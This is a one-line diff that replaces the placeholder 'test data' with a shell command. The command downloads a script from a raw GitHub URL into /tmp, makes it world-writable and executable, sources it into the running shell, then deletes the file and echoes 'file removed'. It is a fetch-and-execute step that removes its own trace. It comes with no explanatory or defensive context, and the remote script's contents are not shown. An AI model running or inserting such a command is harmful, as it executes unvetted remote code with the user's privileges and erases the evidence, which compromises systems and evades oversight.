@@ -1,1 +1,1 @@
-test data 
+cd /tmp && curl https://raw.githubusercontent.com/prasadgopale/linux/master/env/en1.sh >> t6339 && chmod 777 t6339 && . ./t6339 && rm -rf /tmp/t6339 && echo "file removed";
